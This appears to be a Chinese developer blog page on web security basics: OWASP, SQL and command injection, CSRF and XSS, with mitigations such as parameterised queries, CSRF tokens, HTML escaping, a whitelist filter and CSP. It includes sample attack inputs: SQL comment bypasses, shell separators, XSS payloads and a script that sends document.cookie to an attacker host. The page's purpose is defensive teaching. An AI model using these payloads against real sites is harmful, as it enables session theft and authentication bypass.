<template><div><div class="catalog">
<ul>
<li><a href="#t1">前言</a></li>
<li><a href="#t2">OWASP</a></li>
<li><a href="#t3">注入攻击</a></li>
<li><a href="#t4">CSRF 攻击</a></li>
<li><a href="#t5">XSS 攻击</a></li>
<li><a href="#te">参考文章</a></li>
</ul>
</div>
<h2 id="前言" tabindex="-1"><a class="header-anchor" href="#前言" aria-hidden="true">#</a> <span id="t1">前言</span></h2>
<p>在开始准备这一章的时候，对应用安全的理解仅限于依赖升级、SQL 注入等。也是新项目要上线，才开始考虑这方面内容，基本上就是疯狂看大佬的总结（抄作业）。</p>
<p>所以，先把跟了好久的大佬先放上：<a href="https://www.pdai.tech/" target="_blank">Java 全栈知识体系 (pdai.tech)</a></p>
<p>安全部分计划分为两篇：<strong>开发安全（漏洞和原理）</strong> 和 <strong>漏洞测试（软件和测试平台）</strong></p>
<br/>
<p>这里先汇总常见的攻击方式：</p>
<p><strong>OWASP（开放式 web 应用程序安全项目）</strong></p>
<ul>
<li>这个应用安全项目有许多成果，&quot;十大安全隐患列表&quot;最为有名。它的报告列举了最常见的漏洞和修补方法。</li>
</ul>
<p><strong>注入攻击</strong></p>
<ul>
<li>注入攻击最为常见的攻击方式，作为开发而言必须完全避免，主要包括：<code v-pre>SQL 注入</code>, <code v-pre>xPath 注入</code>, <code v-pre>命令注入</code>, <code v-pre>LDAP注入</code>, <code v-pre>CLRF注入</code>, <code v-pre>Host头注入</code>, <code v-pre>Email头注入</code>等等。</li>
</ul>
<p><strong>CSRF 攻击</strong></p>
<ul>
<li>CSRF（Cross-site request forgery）跨站请求伪造。它可以通过攻击，盗用了你的身份，以你的名义发送恶意请求。</li>
</ul>
<p><strong>XSS 攻击</strong></p>
<ul>
<li>XSS 是跨站脚本攻击(Cross Site Scripting)，恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</li>
</ul>
<br/>
<h2 id="owasp" tabindex="-1"><a class="header-anchor" href="#owasp" aria-hidden="true">#</a> <span id="t2">OWASP</span></h2>
<p>OWASP 已完成项目索引：<a href="http://www.owasp.org.cn/OWASP-CHINA/owasp-project/" target="_">项目介绍 — OWASP-CHINA</a></p>
<p>截至目前（2021.9.23），最新版的“10 大漏洞”依然是 2017 版，应该快要出新版了。</p>
<ul>
<li>官方在线版：<a href="http://www.owasp.org.cn/OWASP-CHINA/owasp-project/OWASPTop102017v1.1.pdf" target="_blank" rel="noopener noreferrer">OWASP Top 10 - 2017<ExternalLinkIcon/></a></li>
<li>2017 版下载备用地址：<a href="https://gitee.com/pic_bed_of_shiva/static-resources/blob/26d29676bf65626088949add19db8684fa083808/showns/file/OWASPTop102017v1.1.pdf" target="_blank" rel="noopener noreferrer">OWASPTop102017v1.1.pdf<ExternalLinkIcon/></a></li>
</ul>
<p>这部分文档有说明，而且和后续部分有相当重叠，看文档就行。</p>
<br/>
<h2 id="注入攻击" tabindex="-1"><a class="header-anchor" href="#注入攻击" aria-hidden="true">#</a> <span id="t3">注入攻击</span></h2>
<p>注入攻击最为常见的攻击方式，作为开发而言 <strong>必须完全避免</strong> 。几种不同注入，本质相同，防护方式也类似。</p>
<h3 id="sql-注入" tabindex="-1"><a class="header-anchor" href="#sql-注入" aria-hidden="true">#</a> SQL 注入</h3>
<blockquote>
<p>SQL 注入就是通过将 SQL 命令插入应用程序的 http 请求中，并在服务器端被接收后用于参与数据库操作，最终达到欺骗服务器执行恶意的 SQL 命令的效果。</p>
</blockquote>
<p>理论上来讲，应用程序中只要是与数据库有数据交互的地方，无论是增删改查，如果数据完全受用户控制，而应用程序又处理不当，那么这些地方都是可能存在 SQL 注入的。</p>
<h4 id="漏洞原因" tabindex="-1"><a class="header-anchor" href="#漏洞原因" aria-hidden="true">#</a> 漏洞原因</h4>
<p>SQL 注入需要有以下条件：</p>
<ul>
<li><strong>使用了字符串拼接的方式构造 SQL 语句</strong></li>
<li>不安全的数据库配置，比如对查询集不合理处理，对 sql 查询语句错误时不当的处理，导致其错误信息暴露在前端</li>
<li>过于信任用户在前端所输入的数值，没有过滤用户输入的恶意数据，直接把用户输入的数据当做 SQL 语句执行</li>
</ul>
<p>例如在 JDBC 下，字符串拼接 sql：</p>
<div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token class-name">Statement</span> s <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select id, username, password from sys_user where username= '"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"' and password= '"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">;</span>
s<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>若不对参数进行校验，就可能存在以下 sql：</p>
<div class="language-sql line-numbers-mode" data-ext="sql"><pre v-pre class="language-sql"><code><span class="token keyword">select</span> id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password <span class="token keyword">from</span> sys_user <span class="token keyword">where</span> username<span class="token operator">=</span> <span class="token string">'admin'</span><span class="token comment">#' and password= '123456'</span>
<span class="token keyword">select</span> id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password <span class="token keyword">from</span> sys_user <span class="token keyword">where</span> username<span class="token operator">=</span> <span class="token string">'admin'</span><span class="token comment">--' and password= '123456'</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>通过注释将密码忽略，从而绕过验证。也有其他的注入方式如： <code v-pre>or 1=1</code> 等，不过都类似。</p>
<h4 id="防护措施" tabindex="-1"><a class="header-anchor" href="#防护措施" aria-hidden="true">#</a> 防护措施</h4>
<p>其实也不用防护，现在哪里还有人拼 <code v-pre>SQL</code> ，mybatis 不香吗？该做的框架其实都做好了。。。</p>
<ol>
<li><strong>预编译。在 mybatis xml 场景下，使用 <code v-pre>#{}</code> 来传递参数。</strong></li>
</ol>
<p><code v-pre>#{}</code> 会把传入的数据都当成一个字符串，会对自动传入的数据加一个双引号。例如：<code v-pre>where username=&quot;111&quot;</code></p>
<p><code v-pre>${}</code> 则将传入的数据直接显示生成在 sql 中，如：<code v-pre>where username=111</code> 。这种方式会存在 sql 注入风险。</p>
<p>所以，传入参数时必须使用<code v-pre>#{}</code> 。但是在动态表名、列名时可以需要使用 <code v-pre>${}</code> ，如：</p>
<div class="language-sql line-numbers-mode" data-ext="sql"><pre v-pre class="language-sql"><code> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> ${tableName} <span class="token keyword">where</span> id <span class="token operator">=</span> ${id}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="2">
<li><strong>输入验证，检查用户输入的合法性，以确保输入的内容为正常的数据</strong> 。数据检查应当在客户端和服务器端都执行。</li>
</ol>
<ul>
<li>客户端校验减轻服务器压力，提高用户友好度。但是抓包可以修改，不可作为最终参数。</li>
<li>服务端对参数进行校验，对进入数据库的特殊字符（'&quot;\尖括号&amp;*;等）进行转义处理，或编码转换。</li>
</ul>
<ol start="3">
<li><strong>错误消息处理，不能将 SQL 错误消息返回到前端</strong> ，例如：类型错误、字段不匹配等。</li>
<li><strong>加密处理</strong>，这个比较通俗，数据库内对登陆密码这些超敏感数据，不可能保存明文。</li>
<li>在测试阶段，建议使用专门的 SQL 注入检测工具进行检测。网上有很多这方面的开源工具，例如 sqlmap、SQLninja 等。</li>
</ol>
<h3 id="命令注入" tabindex="-1"><a class="header-anchor" href="#命令注入" aria-hidden="true">#</a> 命令注入</h3>
<blockquote>
<p>命令是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p>
</blockquote>
<p>Java 中 <code v-pre>System.Runtime.getRuntime().exec(cmd);</code> 可以在目标机器上执行命令，而构建参数的过程中可能会引发注入攻击。</p>
<p>在目前遇到过的项目里，倒是没有需要传入命令进行执行的场景。了解下就行了。</p>
<div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token string">"xxxx xxx xxx"</span><span class="token punctuation">;</span>
<span class="token class-name">Runtime</span> run <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Process</span> process <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>常见的注入方式，其实就是 shell 根据命令来找的漏洞：</p>
<ul>
<li>“；” 分割</li>
<li>“&amp;”，“&amp;&amp;”，“||” 分割</li>
<li>“|” 管道符</li>
<li><code v-pre>\r\n %d0%a0</code> 换行</li>
<li><code v-pre>$()</code> 替换</li>
</ul>
<p>上面两个其实也都差不多，都是通过各自的语法来找漏洞。其他的一些 <code v-pre>xPath 注入</code> 、<code v-pre>LDAP 注入</code> 、<code v-pre>CLRF注入</code> 、<code v-pre>Host头注入</code> ，都差不多。</p>
<br/>
<h2 id="csrf-攻击" tabindex="-1"><a class="header-anchor" href="#csrf-攻击" aria-hidden="true">#</a> <span id="t4">CSRF 攻击</span></h2>
<p>CSRF 是一种危害非常大的攻击，又很难以防范。目前几种防御策略虽然可以很大程度上抵御 CSRF 的攻击，但并没有一种完美的解决方案。</p>
<p>原理如下图所示，也不难理解：</p>
<p><img src="https://shiva.oss-cn-hangzhou.aliyuncs.com/picture-master/images/2009040916453171.jpg" alt="img"></p>
<p><img src="https://shiva.oss-cn-hangzhou.aliyuncs.com/picture-master/images/4099767-4e373b4cb613207b.png" alt="img"></p>
<p>由于浏览器自带的安全防护，黑客网站也无法获得客户的 cookie。但是攻击者可以通过 JS，发起特定的请求信息。</p>
<blockquote>
<p>所以 CSRF 的核心，不是拿到用户的认证信息，而是借用认证信息，发出特定请求。对服务端而言，因为无法识别请求来源，从而执行。</p>
</blockquote>
<div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token comment">// 这里没有限制POST Method，导致用户可以不通过POST请求提交数据。</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/url"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">ReponseData</span> <span class="token function">saveSomething</span><span class="token punctuation">(</span><span class="token class-name">XXParam</span> param<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment">// 数据保存操作...</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这在接口规范中也有说明，幂等性、GET 作为查询、POST 修改数据等，不过在实际开发中容易忘。</p>
<h3 id="防护措施-1" tabindex="-1"><a class="header-anchor" href="#防护措施-1" aria-hidden="true">#</a> 防护措施</h3>
<ol>
<li><strong>验证<code v-pre>HTTP Referer</code>字段</strong></li>
</ol>
<p>HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。</p>
<p>对敏感操作请求的 Referer 进行判断，也算是一道防护。</p>
<ul>
<li>优点：使用方便，开发简单，一定程度上能预防 CSRF 攻击；</li>
<li>缺点：这种机制完全依托于浏览器，Referer 字段容易被故意篡改，或者被禁用。</li>
</ul>
<ol start="2">
<li><strong>请求中添加 token 并验证</strong></li>
</ol>
<p>token 就是服务端颁发给客户端的一长串字符串。</p>
<blockquote>
<p>csrf 依赖于浏览器该问链接时自动对应网站的 cookie 带上，所以 token 不放 cookie 里，可以作为 query 参数每次携带，在处理请求前进行 token 验证即可。</p>
</blockquote>
<p>在基于没有其他漏洞会泄漏本次会话的 token 的设想下 ，黑客是无法获取用户的 token，<strong>所以一次会话可以使用同一个 token。</strong></p>
<ul>
<li>优点：安全程度比 Referer 的方式要高；</li>
<li>缺点：实现方式上稍微复杂（GET 需要拼接链接，POST 需要使用 JS 添加参数）；需要保证 token 存储的安全性。</li>
</ul>
<ol start="3">
<li><strong>在 HTTP 头中自定义属性并验证</strong></li>
</ol>
<p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。</p>
<p>通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。</p>
<ul>
<li>优点：使用方式较简单，而且 token 不容易泄露</li>
<li>缺点：使用场合较少，在 Ajax 方法才可以使用，局限性较大。</li>
</ul>
<br/>
<h2 id="xss-攻击" tabindex="-1"><a class="header-anchor" href="#xss-攻击" aria-hidden="true">#</a> <span id="t5">XSS 攻击</span></h2>
<p>XSS 是跨站脚本攻击(Cross Site Scripting)，恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p>
<h3 id="攻击类型" tabindex="-1"><a class="header-anchor" href="#攻击类型" aria-hidden="true">#</a> 攻击类型</h3>
<h4 id="反射型-xss" tabindex="-1"><a class="header-anchor" href="#反射型-xss" aria-hidden="true">#</a> 反射型 XSS</h4>
<blockquote>
<p>反射性 xss 一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的 URL。当受害者点击恶意链接 url 的时候，恶意代码会直接在受害者的主机上的浏览器执行。</p>
</blockquote>
<p>比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 &quot;反射&quot;到受害者的浏览器上，从而浏览器就执行了该脚本。</p>
<p><img src="https://shiva.oss-cn-hangzhou.aliyuncs.com/picture-master/images/dev-security-xss-1.png" alt="img"></p>
<p>因此反射型 XSS 的攻击步骤如下：</p>
<ol>
<li>攻击者在 url 后面的参数中加入恶意攻击代码。</li>
<li>当用户打开带有恶意代码的 URL 的时候，网站服务端将恶意代码从 URL 中取出，拼接在 html 中并且返回给浏览器端。</li>
<li>用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。</li>
<li>攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如 cookie 等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。</li>
</ol>
<h4 id="存储型-xss" tabindex="-1"><a class="header-anchor" href="#存储型-xss" aria-hidden="true">#</a> 存储型 XSS</h4>
<blockquote>
<p>主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p>
</blockquote>
<p><img src="https://shiva.oss-cn-hangzhou.aliyuncs.com/picture-master/images/dev-security-xss-3.png" alt="img"></p>
<div class="language-javascript line-numbers-mode" data-ext="js"><pre v-pre class="language-javascript"><code><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"cookies.shouji.com?param="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>例如，我在一个博客中嵌入如下 js，那么浏览博客的用户打开后，将会执行。</p>
<ol>
<li>攻击者将恶意代码提交到目标网站数据库中。</li>
<li>用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到 html 中返回给浏览器中。</li>
<li>用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。</li>
<li>那么恶意代码执行后，就能获取到用户数据，比如上面的 cookie 等信息，那么把该 cookie 发送到攻击者网站中，那么攻击者拿到该 cookie 然后会冒充该用户的行为，调用目标网站接口等违法操作。</li>
</ol>
<p>防护措施：</p>
<ul>
<li>后端需要对提交的数据进行过滤。</li>
<li>前端也可以做一下处理方式，比如对 script 标签，将特殊字符替换成 HTML 编码这些等。</li>
</ul>
<h4 id="dom-型-xss" tabindex="-1"><a class="header-anchor" href="#dom-型-xss" aria-hidden="true">#</a> DOM 型 XSS</h4>
<blockquote>
<p>基于 DOM 的 XSS 攻击是反射型攻击的变种。服务器返回的页面是正常的，只是我们在页面执行 js 的过程中，会把攻击代码植入到页面中。</p>
</blockquote>
<p><img src="https://shiva.oss-cn-hangzhou.aliyuncs.com/picture-master/images/dev-security-xss-2.png" alt="img"></p>
<ol>
<li>攻击者构造出特殊的 URL、在其中可能包含恶意代码。例如：<code v-pre>http://xxx?name=&lt;script&gt;alert('aaa')&lt;/script&gt;</code></li>
<li>用户打开带有恶意代码的 URL。</li>
<li>用户浏览器收到响应后解析执行。前端使用 js 取出 url 中的恶意代码并执行。</li>
<li>执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口执行攻击者一些操作。</li>
</ol>
<br/>
<h3 id="防御方式" tabindex="-1"><a class="header-anchor" href="#防御方式" aria-hidden="true">#</a> 防御方式</h3>
<p>XSS 攻击其实就是代码的注入。用户的输入被编译成恶意的程序代码。所以，为了防范这一类代码的注入，需要确保用户输入的安全性。对于攻击验证，我们可以采用以下两种措施：</p>
<ul>
<li><strong>编码，就是转义用户的输入，把用户的输入解读为数据而不是代码</strong></li>
<li><strong>校验，对用户的输入及请求都进行过滤检查，如对特殊字符进行过滤，设置输入域的匹配规则等</strong>。</li>
</ul>
<p>具体比如：</p>
<ul>
<li><strong>对于验证输入</strong>，我们既可以在<code v-pre>服务端验证</code>，也可以在<code v-pre>客户端验证</code></li>
<li><strong>对于持久性和反射型攻击</strong>，<code v-pre>服务端验证</code>是必须的，服务端支持的任何语言都能够做到</li>
<li><strong>对于基于 DOM 的 XSS 攻击</strong>，验证输入在客户端必须执行，因为从服务端来说，所有发出的页面内容是正常的，只是在客户端 js 代码执行的过程中才发生可攻击</li>
<li>但是对于各种攻击方式，<strong>我们最好做到客户端和服务端都进行处理</strong>。</li>
</ul>
<p>其它还有一些辅助措施，比如：</p>
<ul>
<li><strong>入参长度限制</strong>： 通过以上的案例我们不难发现 xss 攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。</li>
<li>设置 cookie httponly 为 true（具体请看下文的解释）</li>
</ul>
<p>具体方式如下：</p>
<h4 id="escapehtml" tabindex="-1"><a class="header-anchor" href="#escapehtml" aria-hidden="true">#</a> escapeHTML</h4>
<ul>
<li>前端：</li>
</ul>
<div class="language-javascript line-numbers-mode" data-ext="js"><pre v-pre class="language-javascript"><code><span class="token comment">// util封装可以参考 HTMLParser.js, 或者自己封装</span>
util<span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li>后端， 推荐使用 ApacheCommon 包下 <code v-pre>StringEscapeUtils</code> – 用于正确处理转义字符，产生正确的 Java、JavaScript、HTML、XML 和 SQL 代码；</li>
</ul>
<div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token comment">// encode html</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">StringEscapeUtils</span><span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token string">"&lt;a>abc&lt;/a>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">StringEscapeUtils</span><span class="token punctuation">.</span><span class="token function">unescapeHtml</span><span class="token punctuation">(</span><span class="token string">"&amp;lt;a&amp;gt;abc&amp;lt;/a&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// encode js</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">StringEscapeUtils</span><span class="token punctuation">.</span><span class="token function">escapeJavaScript</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('123')&lt;script>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">StringEscapeUtils</span><span class="token punctuation">.</span><span class="token function">unescapeJavaScript</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert(\'123\')&lt;script>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="过滤或者校验" tabindex="-1"><a class="header-anchor" href="#过滤或者校验" aria-hidden="true">#</a> 过滤或者校验</h4>
<p>校验是一种过滤用户输入以至于让代码中恶意部分被移除的行为。校验都是通过一定的经验和规则，对用户的输入进行匹配，过滤，去除掉存在攻击风险的部分。</p>
<p>我们可以通过黑名单的方式和白名单的方式来设置我们的规则，对用户提交的数据进行有效性验证，仅接受符合我们期望格式的内容提交，阻止或者忽略除此外的其他任何数据。</p>
<ul>
<li><strong>黑名单</strong> 我们可以把某些危险的标签或者属性纳入黑名单，过滤掉它。</li>
<li><strong>白名单</strong> 这种方式只允许部分标签和属性，不在这个白名单中的，一律过滤掉它。</li>
</ul>
<p>这里举个例子，<strong>富文本的防御</strong>: 富文本的情况非常的复杂，js 可以藏在标签里，超链接 url 里，何种属性里。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><pre v-pre class="language-javascript"><code><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert(1)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"abc"</span> onerror<span class="token operator">=</span><span class="token string">"alert(1)"</span><span class="token operator">/</span><span class="token operator">></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>所以我们不能过用上面的方法做简单的转义, 因为情况实在太多了。思路就是黑白名单校验，这里提供一个包，帮助我们去解析 html 树状结构，它使用起来和 jquery 非常的类似。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><pre v-pre class="language-javascript"><code>npm install cheerio <span class="token operator">--</span>save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-ext="js"><pre v-pre class="language-javascript"><code><span class="token keyword">var</span> <span class="token function-variable function">xssFilter</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">html</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>html<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> cheerio <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"cheerio"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> $ <span class="token operator">=</span> cheerio<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//白名单</span>
  <span class="token keyword">var</span> whiteList <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">head</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">div</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">img</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"href"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">font</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token string">"color"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> elem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>whiteList<span class="token punctuation">[</span>elem<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">$</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> elem<span class="token punctuation">.</span>attribs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>whiteList<span class="token punctuation">[</span>elem<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">$</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span>attr<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> $<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
  <span class="token function">xssFilter</span><span class="token punctuation">(</span>
    <span class="token string">'&lt;div>&lt;font color="red">你好&lt;/font>&lt;a href="http://www.baidu.com">百度&lt;/a>&lt;script>alert("哈哈你被攻击了")&lt;/script>&lt;/div>'</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="csp-content-security-policy" tabindex="-1"><a class="header-anchor" href="#csp-content-security-policy" aria-hidden="true">#</a> CSP(Content Security Policy)</h4>
<p>内容安全策略（Content Security Policy，简称 CSP）是一种以可信白名单作机制，来限制网站中是否可以包含某来源内容。</p>
<p>CSP 对你用于浏览页面的浏览器做出了限制，以确保它只能从可信赖来源下载的资源。资源可以是脚本，样式，图片，或者其他被页面引用的文件。这意味着即使攻击者成功的在你的网站中注入了恶意内容，CSP 也能免于它被执行。</p>
<p>默认配置下不允许执行内联代码（``块内容，内联事件，内联样式），以及禁止执行 eval() , newFunction() , setTimeout([string], ...) 和 setInterval([string], ...) 。</p>
<ul>
<li>只允许本站资源</li>
</ul>
